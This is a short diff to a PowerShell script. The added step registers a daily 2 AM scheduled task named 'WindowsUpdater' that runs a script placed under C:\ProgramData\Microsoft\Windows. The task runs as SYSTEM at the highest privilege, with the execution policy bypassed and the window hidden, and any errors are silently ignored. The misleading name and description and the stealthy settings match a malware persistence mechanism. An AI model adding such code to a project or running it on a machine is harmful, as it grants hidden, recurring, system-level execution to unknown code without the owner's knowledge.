@@ -113,3 +113,20 @@ try {
 # STEP 5: Cleanup
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+# STEP 6: Register daily task at 2:00 AM to run the update.ps1 script
+$taskName = "WindowsUpdater"
+$taskDescription = "Daily file package task"
+$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"
+
+try {
+    # If exists, delete first
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    }
+
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $trigger = New-ScheduledTaskTrigger -Daily -At 2:00am
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
+} catch {}
